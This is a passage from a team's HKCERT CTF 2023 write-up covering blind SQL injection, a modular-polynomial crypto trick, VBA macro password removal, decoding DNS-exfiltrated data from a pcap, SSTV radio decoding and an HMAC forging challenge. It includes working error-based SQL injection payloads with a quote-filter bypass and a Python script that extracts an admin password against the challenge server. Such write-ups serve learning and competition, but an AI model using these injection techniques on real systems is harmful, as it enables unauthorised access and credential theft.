<span id=cb14-2><a href=#cb14-2 aria-hidden=true tabindex=-1></a>    <span class=cf>CASE</span> <span class=cf>WHEN</span> <span class=op>&lt;</span>condition<span class=op>&gt;</span> <span class=cf>THEN</span> <span class=dv>1</span> <span class=cf>ELSE</span> <span class=fu>exp</span>(<span class=dv>1000</span>) <span class=cf>END</span></span>
<span id=cb14-3><a href=#cb14-3 aria-hidden=true tabindex=-1></a>) <span class=kw>ASC</span>;</span></code></pre></div><p>I bet you could already tell what it does. If the condition is true,
MySQL would evaluate the <code>THEN</code> clause with ease and we’ll
receive an <code>HTTP</code> <code>200 OK</code> status. On the other
hand, if the <code>ELSE</code> clause gets executed, since
<code>exp(1000)</code> is way beyond what the <code>DOUBLE</code> type
could handle, it throws an error and we’ll see the
<code>500 Internal Server Error</code> status. This could be extremely
handy to check if an expression is true.</p><p>Now for the final question: what should we put as our condition to
test on? The Administrator’s password, of course. 😈</p><p>We wouldn’t have to actually check if the <em>entire password
string</em> equals something. We can just utilize the <code>LIKE</code>
operator, which could tell us whether a substring occur in the password.
Let’s also make sure it only checks for the admin’s password, and not
everyone else’s:</p><div class=sourceCode id=cb15><pre class="sourceCode sql"><code class="sourceCode sql"><span id=cb15-1><a href=#cb15-1 aria-hidden=true tabindex=-1></a><span class=kw>SELECT</span> username, publicnote <span class=kw>FROM</span> users <span class=kw>ORDER</span> <span class=kw>BY</span> (</span>
<span id=cb15-2><a href=#cb15-2 aria-hidden=true tabindex=-1></a>    <span class=cf>CASE</span> <span class=cf>WHEN</span> username <span class=op>!=</span> <span class=st>&#39;Administrator&#39;</span> <span class=kw>OR</span> <span class=kw>password</span> <span class=kw>LIKE</span> <span class=st>&#39;0%&#39;</span> <span class=cf>THEN</span> <span class=dv>1</span> <span class=cf>ELSE</span> <span class=fu>exp</span>(<span class=dv>1000</span>) <span class=cf>END</span></span>
<span id=cb15-3><a href=#cb15-3 aria-hidden=true tabindex=-1></a>) <span class=kw>ASC</span>;</span></code></pre></div><p>Some knowledge of logic comes handy. Asking if an account being
<code>Administrator</code> implies <code>0</code> is in the password, is
equivalent to asking if all accounts are either not
<code>Administrator</code> (normal users) or their passwords contain
<code>0</code>. The query successfully returns some results only if the
check is passed on all records in the <code>user</code> table, hence the
“for all” quantifier.</p><p>Enough maths. Since the filter forbids quotes, we’ll finally replace
all the strings with <code>CONCAT</code> and <code>CHAR</code>
functions.</p><div class=sourceCode id=cb16><pre class="sourceCode sql"><code class="sourceCode sql"><span id=cb16-1><a href=#cb16-1 aria-hidden=true tabindex=-1></a><span class=kw>SELECT</span> username, publicnote <span class=kw>FROM</span> users <span class=kw>ORDER</span> <span class=kw>BY</span> (</span>
<span id=cb16-2><a href=#cb16-2 aria-hidden=true tabindex=-1></a>    <span class=cf>CASE</span> <span class=cf>WHEN</span> username <span class=op>!=</span> <span class=fu>CONCAT</span>(<span class=dt>CHAR</span>(<span class=dv>65</span>), <span class=dt>CHAR</span>(<span class=dv>100</span>), <span class=dt>CHAR</span>(<span class=dv>109</span>), <span class=dt>CHAR</span>(<span class=dv>105</span>), <span class=dt>CHAR</span>(<span class=dv>110</span>), <span class=dt>CHAR</span>(<span class=dv>105</span>), <span class=dt>CHAR</span>(<span class=dv>115</span>), <span class=dt>CHAR</span>(<span class=dv>116</span>), <span class=dt>CHAR</span>(<span class=dv>114</span>), <span class=dt>CHAR</span>(<span class=dv>97</span>), <span class=dt>CHAR</span>(<span class=dv>116</span>), <span class=dt>CHAR</span>(<span class=dv>111</span>), <span class=dt>CHAR</span>(<span class=dv>114</span>)) </span>
<span id=cb16-3><a href=#cb16-3 aria-hidden=true tabindex=-1></a>    <span class=kw>OR</span> <span class=kw>password</span> <span class=kw>LIKE</span> <span class=fu>CONCAT</span>(<span class=dt>CHAR</span>(<span class=dv>48</span>), <span class=dt>CHAR</span>(<span class=dv>37</span>)) <span class=cf>THEN</span> <span class=dv>1</span> <span class=cf>ELSE</span> <span class=fu>EXP</span>(<span class=dv>1000</span>) <span class=cf>END</span></span>
<span id=cb16-4><a href=#cb16-4 aria-hidden=true tabindex=-1></a>) <span class=kw>ASC</span>;</span></code></pre></div><p>Now if we send the payload to the server and it doesn’t crash and
returns us some results, we’d know the admin’s password starts with
<code>0</code>.</p><h3 id=solution-1>Solution</h3><ol type=1><li>Prepare a list of possible characters in the password. In this case
it’s just the decimal digits (<code>0 ~ 9</code>), as hinted by the
source code.</li><li>Start with an empty string <span class="math inline">\(s\)</span>.
Craft our payload, for each character <span class="math inline">\(c\)</span>, to check if the password begins with
<span class="math inline">\(s \,\Vert\, c\)</span>.</li><li>If the response status code is <code>200 OK</code>, remember the
corresponding character, and append it to <span class="math inline">\(s\)</span>.</li><li>Repeat until you have the entire password, login as admin and do
hax</li></ol><div class=sourceCode id=cb17><pre class="sourceCode python"><code class="sourceCode python"><span id=cb17-1><a href=#cb17-1 aria-hidden=true tabindex=-1></a><span class=im>import</span> requests</span>
<span id=cb17-2><a href=#cb17-2 aria-hidden=true tabindex=-1></a></span>
<span id=cb17-3><a href=#cb17-3 aria-hidden=true tabindex=-1></a>character_list <span class=op>=</span> <span class=st>&#39;0123456789&#39;</span></span>
<span id=cb17-4><a href=#cb17-4 aria-hidden=true tabindex=-1></a></span>
<span id=cb17-5><a href=#cb17-5 aria-hidden=true tabindex=-1></a>cookies <span class=op>=</span> {</span>
<span id=cb17-6><a href=#cb17-6 aria-hidden=true tabindex=-1></a>    <span class=st>&#39;token&#39;</span>: <span class=st>&#39;YWFhOmFhYQ==&#39;</span></span>
<span id=cb17-7><a href=#cb17-7 aria-hidden=true tabindex=-1></a>}</span>
<span id=cb17-8><a href=#cb17-8 aria-hidden=true tabindex=-1></a></span>
<span id=cb17-9><a href=#cb17-9 aria-hidden=true tabindex=-1></a>headers <span class=op>=</span> {</span>
<span id=cb17-10><a href=#cb17-10 aria-hidden=true tabindex=-1></a>    <span class=st>&#39;Accept&#39;</span>: <span class=st>&#39;*/*&#39;</span>,</span>
<span id=cb17-11><a href=#cb17-11 aria-hidden=true tabindex=-1></a>    <span class=st>&#39;Accept-Language&#39;</span>: <span class=st>&#39;en-US,en;q=0.5&#39;</span>,</span>
<span id=cb17-12><a href=#cb17-12 aria-hidden=true tabindex=-1></a>    <span class=st>&#39;Referer&#39;</span>: <span class=st>&#39;http://chal-a./hkcert23.pwnable.hk:28107/home&#39;</span>,</span>
<span id=cb17-13><a href=#cb17-13 aria-hidden=true tabindex=-1></a>    <span class=st>&#39;Connection&#39;</span>: <span class=st>&#39;keep-alive&#39;</span>,</span>
<span id=cb17-14><a href=#cb17-14 aria-hidden=true tabindex=-1></a>}</span>
<span id=cb17-15><a href=#cb17-15 aria-hidden=true tabindex=-1></a></span>
<span id=cb17-16><a href=#cb17-16 aria-hidden=true tabindex=-1></a>pw <span class=op>=</span> <span class=st>&#39;&#39;</span></span>
<span id=cb17-17><a href=#cb17-17 aria-hidden=true tabindex=-1></a><span class=cf>while</span> <span class=bu>len</span>(pw) <span class=op>&lt;</span> <span class=dv>16</span>:</span>
<span id=cb17-18><a href=#cb17-18 aria-hidden=true tabindex=-1></a>    <span class=cf>for</span> c <span class=kw>in</span> character_list:</span>
<span id=cb17-19><a href=#cb17-19 aria-hidden=true tabindex=-1></a>        stmt <span class=op>=</span> <span class=st>&#39;&#39;</span></span>
<span id=cb17-20><a href=#cb17-20 aria-hidden=true tabindex=-1></a>        <span class=cf>for</span> char <span class=kw>in</span> pw:</span>
<span id=cb17-21><a href=#cb17-21 aria-hidden=true tabindex=-1></a>            stmt <span class=op>+=</span> <span class=ss>f&#39;CHAR(</span><span class=sc>{</span><span class=bu>ord</span>(char)<span class=sc>}</span><span class=ss>),&#39;</span></span>
<span id=cb17-22><a href=#cb17-22 aria-hidden=true tabindex=-1></a></span>
<span id=cb17-23><a href=#cb17-23 aria-hidden=true tabindex=-1></a>        stmt <span class=op>+=</span> <span class=ss>f&#39;CHAR(</span><span class=sc>{</span><span class=bu>ord</span>(c)<span class=sc>}</span><span class=ss>),CHAR(37)&#39;</span></span>
<span id=cb17-24><a href=#cb17-24 aria-hidden=true tabindex=-1></a></span>
<span id=cb17-25><a href=#cb17-25 aria-hidden=true tabindex=-1></a>        payload <span class=op>=</span> <span class=ss>f&#39;username, (case WHEN username != CONCAT(CHAR(65), CHAR(100), CHAR(109), CHAR(105), CHAR(110), CHAR(105), CHAR(115), CHAR(116), CHAR(114), CHAR(97), CHAR(116), CHAR(111), CHAR(114)) or password LIKE CONCAT(</span><span class=sc>{</span>stmt<span class=sc>}</span><span class=ss>) THEN 1 ELSE EXP(1000) END)&#39;</span></span>
<span id=cb17-26><a href=#cb17-26 aria-hidden=true tabindex=-1></a></span>
<span id=cb17-27><a href=#cb17-27 aria-hidden=true tabindex=-1></a>        params <span class=op>=</span> {</span>
<span id=cb17-28><a href=#cb17-28 aria-hidden=true tabindex=-1></a>            <span class=st>&#39;noteType&#39;</span>: <span class=st>&#39;public&#39;</span>,</span>
<span id=cb17-29><a href=#cb17-29 aria-hidden=true tabindex=-1></a>            <span class=st>&#39;column&#39;</span>: payload,</span>
<span id=cb17-30><a href=#cb17-30 aria-hidden=true tabindex=-1></a>            <span class=st>&#39;ascending&#39;</span>: <span class=st>&#39;ASC&#39;</span>,</span>
<span id=cb17-31><a href=#cb17-31 aria-hidden=true tabindex=-1></a>        }</span>
<span id=cb17-32><a href=#cb17-32 aria-hidden=true tabindex=-1></a>        response <span class=op>=</span> requests.get(<span class=st>&#39;http://chal-a./hkcert23.pwnable.hk:28107/note&#39;</span>,</span>
<span id=cb17-33><a href=#cb17-33 aria-hidden=true tabindex=-1></a>                                params<span class=op>=</span>params, cookies<span class=op>=</span>cookies, headers<span class=op>=</span>headers)</span>
<span id=cb17-34><a href=#cb17-34 aria-hidden=true tabindex=-1></a></span>
<span id=cb17-35><a href=#cb17-35 aria-hidden=true tabindex=-1></a>        <span class=cf>if</span> response.status_code <span class=op>==</span> <span class=dv>200</span>:</span>
<span id=cb17-36><a href=#cb17-36 aria-hidden=true tabindex=-1></a>            pw <span class=op>+=</span> c</span>
<span id=cb17-37><a href=#cb17-37 aria-hidden=true tabindex=-1></a>            <span class=bu>print</span>(<span class=st>&#39;Got character:&#39;</span>, c)</span>
<span id=cb17-38><a href=#cb17-38 aria-hidden=true tabindex=-1></a>            <span class=cf>break</span></span>
<span id=cb17-39><a href=#cb17-39 aria-hidden=true tabindex=-1></a></span>
<span id=cb17-40><a href=#cb17-40 aria-hidden=true tabindex=-1></a><span class=bu>print</span>(<span class=st>&#39;Got password:&#39;</span>, pw)</span></code></pre></div><h2 id=solitude-gldanoob>Solitude (gldanoob)</h2><p>Not really a hard crypto challenge but I figured the math behind the
solution would be worth explaining.</p><p>Attachment:
https://file./hkcert23.pwnable.hk/solitude_92b66a8882479819f0170a1efa4c8baf.zip</p><p>We’re given the source code of a script that evaluates an integer
polynomial function <span class="math inline">\(f(x) \equiv s +
\sum_{i=1}^{10} a_i x^i \mod p\)</span> on a user input <span class="math inline">\(x \in \mathbb{Z}\)</span>, given a random
<del>prime</del> odd number <span class="math inline">\(p\)</span>. The
coefficients <span class="math inline">\(0 \leq s, \,a_i &lt; p\)</span>
are not shown to the user, and our goal is to infer the secret <span class="math inline">\(s\)</span>, provided only the value of <span class="math inline">\(f(x)\)</span>.</p><p>The program only asks for and yields one number. From this point
we’ll have to either enter the secret <span class="math inline">\(s\)</span> exactly, or the program will just
restart and all of the coefficients will be regenerated.</p><p>Since <span class="math inline">\(a_i\)</span> can be as large as
<span class="math inline">\(p\)</span>, it’s virtually impossible to
guess or brute force it. We would have to make sure we choose an <span class="math inline">\(x\)</span>, such that <span class="math inline">\(f(x)\)</span> wouldn’t be in terms of the
coefficients other than <span class="math inline">\(s\)</span>.</p><p>Can’t we just use <span class="math inline">\(0\)</span> as the input
so that <span class="math inline">\(f(x) = s\)</span>? Unfortunately the
program also invalidates our input if <span class="math inline">\(x
\equiv 0 \mod p\)</span>, so we can’t just make <span class="math inline">\(x\)</span> a multiple of <span class="math inline">\(p\)</span>.</p><p>What else can we do to eliminate the non-constant terms? Well, since
the output is <span class="math inline">\(s + \sum_{i=1}^{10} a_i
x^i\)</span> <strong>modulo <span class="math inline">\(p\)</span></strong>, whenever <span class="math inline">\(p\)</span> divides <span class="math inline">\(x^i\)</span>, we would know that <span class="math inline">\(a_ix^i = 0 \mod p\)</span> and we could zero out
terms in the polynomial.</p><p>The first thing that came to mind is <span class="math inline">\(x =
\sqrt{p}\)</span> , since <span class="math inline">\(p \mid
x^i\)</span> for <span class="math inline">\(i \geq 2\)</span>. But how
many tries would it take to get a perfect square <span class="math inline">\(p\)</span>? As <span class="math inline">\(0 &lt;
p &lt; 2^{1024}\)</span> and <span class="math inline">\(0 &lt; \sqrt{p}
&lt; 2^{512}\)</span>, the probability of getting <span class="math inline">\(\sqrt{p} \in \mathbb{Z}\)</span> is approximately
<span class="math inline">\(2^{512} / 2^{1024} = 1/2^{512}\,\)</span>.
And obviously <span class=citation data-cites=mystiz>@mystiz</span>
doesn’t own a quantum computer so it’s also a no.</p><p>What about the factors of <span class="math inline">\(p\)</span>?
Would <span class="math inline">\(p/3\)</span> work if <span class="math inline">\(p\)</span> is a multiple of <span class="math inline">\(3\)</span>? Let’s do the math: <span class="math display">\[
f(\frac{p}{3}) = s + \frac{a_1p}{3} + \frac{a_3p^2}{9} + ... +
\frac{a_3p^{10}}{3^{10}} \mod p
\]</span> Can we express the terms in the form <span class="math inline">\(np\)</span>, with <span class="math inline">\(n\)</span> being an integer? It turns out <em>if
<span class="math inline">\(p\)</span> is also a multiple of <span class="math inline">\(9\)</span></em>, then whenever <span class="math inline">\(p/9\)</span> occurs we’ll know it’s just another
integer.</p><p>Assuming <span class="math inline">\(9 \mid p\)</span> : <span class="math display">\[
f(\frac{p}{3}) \equiv s + \frac{a_1p}{3} + p\,a_3 \cdot \frac{p}{9} +
... + \: p^5a_{10} \cdot(\frac{p}{9})^5
\\ \equiv s + \dfrac{a_1 p}{3}\mod p
\]</span></p><p>We’re close. How do we make <span class="math inline">\(a_1p/3\)</span> a multiple of <span class="math inline">\(p\)</span>? Only when <span class="math inline">\(a_1\)</span> is a multiple of <span class="math inline">\(3\)</span>. ### Solution 1. Keep restarting the
program until <span class="math inline">\(9 \mid p\)</span> 2. Put <span class="math inline">\(x = p/3\)</span>, read the output <span class="math inline">\(f(x)\)</span> then enter the secret exactly as the
output 3. Repeat enough times and eventually <span class="math inline">\(a_1\)</span> will also be divisible by <span class="math inline">\(3\)</span>, causing <span class="math inline">\(s
= f(p/3)\)</span>. 4. Profit</p><div class=sourceCode id=cb18><pre class="sourceCode python"><code class="sourceCode python"><span id=cb18-1><a href=#cb18-1 aria-hidden=true tabindex=-1></a><span class=im>from</span> pwn <span class=im>import</span> <span class=op>*</span></span>
<span id=cb18-2><a href=#cb18-2 aria-hidden=true tabindex=-1></a></span>
<span id=cb18-3><a href=#cb18-3 aria-hidden=true tabindex=-1></a><span class=cf>while</span> <span class=va>True</span>:</span>
<span id=cb18-4><a href=#cb18-4 aria-hidden=true tabindex=-1></a>    r <span class=op>=</span> <span class=ex>connect</span>(<span class=st>&#39;chal./hkcert23.pwnable.hk&#39;</span>, <span class=dv>28103</span>)</span>
<span id=cb18-5><a href=#cb18-5 aria-hidden=true tabindex=-1></a>    p <span class=op>=</span> <span class=bu>int</span>(r.recvline()[<span class=dv>4</span>:])</span>
<span id=cb18-6><a href=#cb18-6 aria-hidden=true tabindex=-1></a>    <span class=cf>if</span> p <span class=op>%</span> <span class=dv>9</span> <span class=op>!=</span> <span class=dv>0</span>:</span>
<span id=cb18-7><a href=#cb18-7 aria-hidden=true tabindex=-1></a>        <span class=cf>continue</span></span>
<span id=cb18-8><a href=#cb18-8 aria-hidden=true tabindex=-1></a>    r.sendline(<span class=bu>str</span>(p <span class=op>//</span> <span class=dv>3</span>))</span>
<span id=cb18-9><a href=#cb18-9 aria-hidden=true tabindex=-1></a></span>
<span id=cb18-10><a href=#cb18-10 aria-hidden=true tabindex=-1></a>    y <span class=op>=</span> <span class=bu>int</span>(r.recvline()[<span class=dv>10</span>:])</span>
<span id=cb18-11><a href=#cb18-11 aria-hidden=true tabindex=-1></a>    r.sendline(<span class=bu>str</span>(y))</span>
<span id=cb18-12><a href=#cb18-12 aria-hidden=true tabindex=-1></a></span>
<span id=cb18-13><a href=#cb18-13 aria-hidden=true tabindex=-1></a>    out <span class=op>=</span> r.recvline()</span>
<span id=cb18-14><a href=#cb18-14 aria-hidden=true tabindex=-1></a>    <span class=cf>if</span> <span class=st>b&#39;/hkcert&#39;</span> <span class=kw>in</span> out:</span>
<span id=cb18-15><a href=#cb18-15 aria-hidden=true tabindex=-1></a>        <span class=bu>print</span>(out)</span>
<span id=cb18-16><a href=#cb18-16 aria-hidden=true tabindex=-1></a>        <span class=cf>break</span></span></code></pre></div><h2 id=gacha-simulator-vow>Gacha Simulator (vow)</h2><h3 id=given-information>Given Information:</h3><p>We are given a PowerPoint file that has a gacha game made using
VBA/Macros. As mentioned in the challenge description, we need to pull a
5 star card, however we only have 10 rolls, and our chances of getting a
5 star is 0%.</p><figure><img src=/hkcert/rySGoQx46.jpg alt=ads><figcaption aria-hidden=true>ads</figcaption></figure><p>If we try to open the VBA file, we can see that it is locked with a
password:</p><figure><img src=/hkcert/H17Fj7lEp.jpg alt=password><figcaption aria-hidden=true>password</figcaption></figure><h3 id=vba-password-non-existent>VBA Password == Non-existent</h3><p>As given in the hints, we can crack the password of the VBA. There
are many ways to do so, but I used this website to crack/modify the
password (follow the steps to modify the password):</p><p>https://master.ayra.ch/unlock/</p><p>Once you modified the password, you can now open the VBA and read
what is inside:</p><figure><img src=/hkcert/SkMipXlNa.png alt=image><figcaption aria-hidden=true>image</figcaption></figure><h3 id=code-modifying>Code Modifying</h3><p>If you look around the code, we can see that in <strong>Module
2</strong>, we can actually modify the ticket count (see comment in
VBA):</p><figure><img src=/hkcert/BkbYA7gV6.png alt=image><figcaption aria-hidden=true>image</figcaption></figure><p>But in reality, you don’t even need to change the ticket count, just
<strong>modify the gacha probability</strong> and make it so that every
roll you get will be a 5 star card!</p><p>You can find the code for the gacha probabilities by clicking the
<strong>“Draw a Card”</strong> button:</p><figure><img src=/hkcert/S1diJExNa.png alt=image><figcaption aria-hidden=true>image</figcaption></figure><p>If we change all the “out” variables to 12 and roll, we get the
flag:</p><figure><img src=/hkcert/SkAzlEgNp.png alt=image><figcaption aria-hidden=true>image</figcaption></figure><h3 id=getting-the-flilililiag>Getting the FlIlIlIlIag</h3><p>Slight problem, the flag contains a lot of similar characters.</p><p>You can always try out and see which combination works, but can we
leak the flag directly?</p><p>It turns out the VBA is using a WebBrowser as display, so we can get
the HTML code of the browser by adding in some extra code :</p><figure><img src=/hkcert/BJcGGNlNa.png alt=image><figcaption aria-hidden=true>image</figcaption></figure><figure><img src=/hkcert/HJWOGNlN6.png alt=image><figcaption aria-hidden=true>image</figcaption></figure><p>Now, you can remove the unnecessary HTML code and submit the
flag!</p><p>||<strong>/hkcert23{FIl1liIIlI1III1lll1IlI11ag_Hmrnmmrnmmmrnmn}</strong>||</p><h2 id=yes-i-know-i-know-vow-degendemolisher>Yes, I Know I Know (vow,
degendemolisher)</h2><blockquote><p>“where flag?”</p><p>- vow, 2023 ### Finding the right packet</p></blockquote><p>We received a .pcap file, and as suggested by the hint, we should
open it using Wireshark:</p><figure><img src=/hkcert/Skr6bLg46.png alt=image><figcaption aria-hidden=true>image</figcaption></figure><p>Now here comes the challenge: <strong>What should we be looking
for?</strong></p><p>Perhaps you can try to search some keywords first, something like
<strong>flag</strong>, <strong>secrets</strong>, <strong>file
extensions</strong>, etc.</p><p>Or maybe search for specific protocols first, such as
<strong>http</strong> (usually readable), <strong>TCP</strong>, etc.</p><p>If we search .txt (using search, not filter, open it with Ctrl+F),
you would see that the search function returns some results, and if we
follow the packets (taught in the hints), we should see these:</p><p><img src=/hkcert/BJqVV8gNT.png alt=image> (TCP Stream 20)</p><p><img src=/hkcert/HJIDNIlNa.png alt=image> (TCP Stream 51 / HTTP
Packet 1204)</p><p>Looking at these, we can see that there is a file named
<strong>secrets.txt.txt</strong> (most likely our flag), and there is
something called <strong>“Invoke-DNSExfiltrator”</strong>.</p><p><strong>Googling “Invoke-DNSExfiltrator”</strong> brings us to a
GitHub repository, and you will learn that a technique called
<strong>“DNS Exfiltration”</strong> is being used. (which explains why
hint 5 tells you to extract information from DNS packets)</p><p>Repository: https://github.com/Arno0x/DNSExfiltrator</p><p><strong>So what is DNS Exfiltration?</strong> It is basically a
method that allows hackers to sneak data or commands into DNS
packets.</p><h3 id=dddddddddnnnnnnnnnnnnnnnsssssssssssssss>DDDDDDDDDNNNNNNNNNNNNNNNSSSSSSSSSSSSSSS</h3><p>Now, we know that the flag is most likely contrained in DNS packets,
<strong>which one is the correct one</strong>?</p><p>In this case, the DNS packets sent after the 1204 HTTP packet are
correct:</p><figure><img src=/hkcert/rkz4wUxE6.png alt=image><figcaption aria-hidden=true>image</figcaption></figure><p>There are some clues to determine that these DNS packets the correct
ones: 1. These packets are sent right after the 1204 HTTP packets. 2.
The type is TXT. 3. The DNS packets should be successfully sent. 4. If
you look below of the 1204 HTTP packet, you will see something like a
command:</p><figure><img src=/hkcert/B1aE_Lx4T.png alt=image><figcaption aria-hidden=true>image</figcaption></figure><p>Reading the GitHub repository, you will realize that the command line
argument <strong>“-d”</strong> which specifies the domain name to use
for DNS requests, so we should be looking for DNS packets with
<strong>“igotoschoolbybus.online”</strong>.</p><p>You will also notice that there is a command line argument
<strong>“-p”</strong>, which according to the repository, is used to
<strong>set a password for basic RC4 encryption</strong>. In other
words, <strong>K#2dF!8t@1qZ</strong> is most likely a key to decrypt the
data.</p><h3 id=decoding-is-hard>Decoding is hard</h3><p>There are 3 packets in question: 1.
init.ONSWG4TFORZS45DYOQXHI6DUPQZA.base64.igotoschoolbybus.online 2.
0.EO6ylFlsUc_7u_QD8gBDp8L8iFiGZGkhptC_QwnSem_ivrO3zFUgj-nfi9hMhgL?khV2U6tVzJq5EWnz-yXZhBWFmKMaKaM65qclb77kF5MWxV6mdVGDyj9BdDJS6uC?49h41eLONT5V_UHgksMdORol-2cYgWkzWj6H6ae8uRzgRMJjDmYss8XBOekyibe.tQVMNb2669ZzoRFkDZWIylBaJ5C.igotoschoolbybus.online
3. 1.Lp8co2gYHOgdIDqj7CIEWkM.igotoschoolbybus.online</p><p>By Googling harder (or maybe reading the source code), you might
stumble across a site which explains how the DNSExfiltrator packets
work:</p><p>Site (In Chinese): https://www.freebuf.com/sectool/223929.html</p><p>If you don’t know Chinese, no worries, here is a quick rundown on how
the <strong>.init packets</strong> work:</p><figure><img src=/hkcert/HkF0TLlVT.png alt=image><figcaption aria-hidden=true>image</figcaption></figure><p>The <strong>.init packet</strong> will be encoded in
<strong>Base32</strong>, and specifies the information in the image
above.</p><p>We can use CyberChef to decode the packets:
https://gchq.github.io/CyberChef/</p><p>Decoding the header data using CyberChef gives us:</p><figure><img src=/hkcert/r1NVCLl4p.png alt=image><figcaption aria-hidden=true>image</figcaption></figure><p>The file name is <strong>secret.txt.txt</strong>, and there are
<strong>2 packets</strong> containing the data.</p><p>Now as for the other 2 DNS packets, the data is arranged like
this:</p><figure><img src=/hkcert/r1Q_xPeEp.png alt=image><figcaption aria-hidden=true>image</figcaption></figure><p>Since there is no specified encoding method after decoding the .init
packet, it is safe to assume that it is encoded using
<strong>Base64URL</strong>.</p><p><strong>IMPORTANT NOTE: THE DATA IS ENCODED WITH BASE64URL, NOT
BASE64.</strong> <strong>REFERENCE:
https://github.com/Arno0x/DNSExfiltrator/blob/8faa972408b0384416fffd5b4d42a7aa00526ca8/dnsexfiltrator.py#L56</strong></p><p>Now we can decode the actual data by removing the heading number and
trailing DNS address first, then decode it with Base64URL (Change it in
Alphabet) and decrypt it with RC4 using the password:</p><figure><img src=/hkcert/rkFF-DgET.png alt=image><figcaption aria-hidden=true>image</figcaption></figure><p>If you notice <strong>the first two letters “PK”</strong>, this is
hinting that this is an <strong>PKZIP file</strong>. We can use the
unzip operation in CyberChef to turn this into an ZIP file and open
it:</p><figure><img src=/hkcert/S1mmMPx4T.png alt=image><figcaption aria-hidden=true>image</figcaption></figure><p>And there is our flag:</p><p>||<strong>/hkcert23{v3ry_5n34ky_w17h_dn53xf1l7r470r_5345623}</strong>||</p><h2 id=hz-attempted-by-degendemolisher>52Hz (attempted by
degendemolisher)</h2><p>Get the flag from the I/Q signal recording. Frequency Modulation; 440
MHz. <a href=https://file./hkcert23.pwnable.hk/52hz_dc866d3052ea3db76f9a5f4089aff8c3.zip>Attachment</a></p><p><em>Ah yes, forensics. Sound? Looks doable.</em> <em>*reads
description*</em> <em>I/Q what..?</em></p><p>You get some hints from the description: - I/Q signal - Frequency
modulation</p><p>And some more hints from the attachment filename
<code>SDRuno_20231009_134842Z_440113kHz.wav</code>: - SDRuno</p><h3 id=trials>Trials</h3><p>Before I do dumb shvt and dive deep into any rabbit holes, I quickly
checked its spectrograms and metadata.</p><p><em>Nothing.</em></p><p>So I started searching. From our best buddy google, SDR = <a href=https://en.wikipedia.org/wiki/Software-defined_radio>Software-defined
radio</a>, and SDRs come with abilities to <a href=https://k3xec.com/packrat-processing-iq/>demodulate I/Q
signals</a> (which is what communicates radio signals).</p><p>So of course I downloaded SDRuno, opened the .wav file with it, tuned
the frequency to 440MHz (according to desc), and got some weird noises
sounding like a thousand birds squeaking on steroids.</p><figure><img src=/hkcert/ByyJJ_lEp.jpg alt="Screenshot 2023-11-14 035136"><figcaption aria-hidden=true>Screenshot 2023-11-14 035136</figcaption></figure><p>Here’s where I got stumped. Then what? This has to be some
information but what can I decode it with? I had no prior knowledge
about radio stuff and I tried a few radio decoders but to no avail.</p><h3 id=after-the-challenge-ends>After the challenge ends</h3><p>In the writeup threads the challenge author kindly revealed some
information about the mysteries:</p><p><img src=/hkcert/B1joyux4a.png alt=image> <img src=/hkcert/Hy2ZlOx46.png alt=image> <del>tbh I didn’t even fully
understand those but we don’t talk about that</del></p><p>There was also <a href=https://www.sigidwiki.com/wiki/Slow-Scan_Television_(SSTV)>an
informative page on SSTV</a> in the thread which had an entire list of
decoding softwares supporting SSTV, and I chose <a href=https://www.blackcatsystems.com/software/sstv.html>Black Cat
Software</a>. Luckily this software also <a href=https://www.blackcatsystems.com/software/sdruno_plugin.html>supports
SDRuno as a plugin</a>, so I had to worry less about the bridging and
recording problems.</p><p>The Black Cat SSTV software (will call it BC from now on) is more
intuitive than SDRuno (which appears to be a complete mess to a layman)
and has actually good guides on how to use on ther page.</p><p>After following their guides and goofing around for a while, I
finally got something rather promising:</p><p><img src=/hkcert/By_LVugEa.png alt=image> <strong><em>’tis a
QRcode baby</em></strong> But imagine being able to scan it – I
can’t.</p><p>So I messed around more with the settings, specifically changed this
parameter:</p><figure><img src=/hkcert/ByZAVulN6.png alt=image><figcaption aria-hidden=true>image</figcaption></figure><p>And it worked like a charm:</p><figure><img src=/hkcert/S1PfE_l46.png alt=image><figcaption aria-hidden=true>image</figcaption></figure><p>After cropping and skewing and stretching:</p><figure><img src=/hkcert/HykdHOgN6.png alt=image><figcaption aria-hidden=true>image</figcaption></figure><p>Looks promising right? Imma try scanning it…doesn’t work? I used my
android phone and online qrcode readers – all of which failed to read
it. Until <span class=citation data-cites=vow>@vow</span> pointed
his <strong>iPhone</strong> towards my discord stream, and scanned it
with ease. <del>Turns out iPhone actually has a reason to exist other
than peer pressure – scanning QRcodes.</del></p><p>Flag: ||/hkcert23{n0_0n3_pl4ys_r4d10_n0w4d4ys}||</p><p>Yes I’m still trying with my android. And no its camera is
intact.</p><h2 id=sign-me-a-flag-ii-attempted-by-gldanoob>Sign me a flag (II)
(attempted by gldanoob)</h2><p>Attachment:
https://file./hkcert23.pwnable.hk/sign-me-a-flag-ii_ee9268d1310ede6d37cd4b5eda18457f.zip</p><p>This is an advanced version of the challenge <em>Sign me a flag
(I)</em>, of which <span class=citation data-cites=mystiz>@mystiz</span> <em>kindly</em> provided a partial
solution guide. You can read it here and be amazed of his sophisticated
understanding of cryptography: https://hackmd.io/<span class=citation data-cites=blackb6a//hkcert-ctf-2023-i-en-a58d115f39feab46>@blackb6a//hkcert-ctf-2023-i-en-a58d115f39feab46</span>#%E6%B1%82%E6%97%97%E7%B0%BD%E5%90%8D-I–Sign-me-a-Flag-I-Crypto</p><p>Anyways, the program allows you to sign a message with a hidden
random server key combined with the user-provided client key: <span class="math display">\[ \text{Sign}_i(k_c, m) = \text{HMAC-SHA256}(k_c
\oplus k_s, i \mathbin\Vert m) \]</span></p><p>And our goal is to forge a signature for the string
<code>"gib flag pls"</code>, with the client key set to null: <span class="math display">\[ \text{Sign}_i(0, \,\text{gib flag pls}) =
\text{HMAC-SHA256}(k_s, i \mathbin\Vert \,\text{gib flag pls})
\]</span></p><p>And of course, the program bans the word <code>flag</code> if you try
to sign it using the program itself.</p><p>The setup is pretty much the same as the previous challenge, however
<span class=citation data-cites=mystiz>@mystiz</span> cleverly added
some subtle differences. In <em>Sign me a flag (I)</em>, the XOR
operator (<span class="math inline">\(\oplus\)</span>) was defined as
follows:</p><div class=sourceCode id=cb19><pre class="sourceCode py"><code class="sourceCode python"><span id=cb19-1><a href=#cb19-1 aria-hidden=true tabindex=-1></a><span class=kw>def</span> xor(a, b):</span>
<span id=cb19-2><a href=#cb19-2 aria-hidden=true tabindex=-1></a>    <span class=cf>return</span> <span class=bu>bytes</span>(u<span class=op>^</span>v <span class=cf>for</span> u, v <span class=kw>in</span> <span class=bu>zip</span>(a, b))</span></code></pre></div><p>Since the output had the length of the shorter operand, providing
only 1 byte as an operand would give us a 1-byte output as the
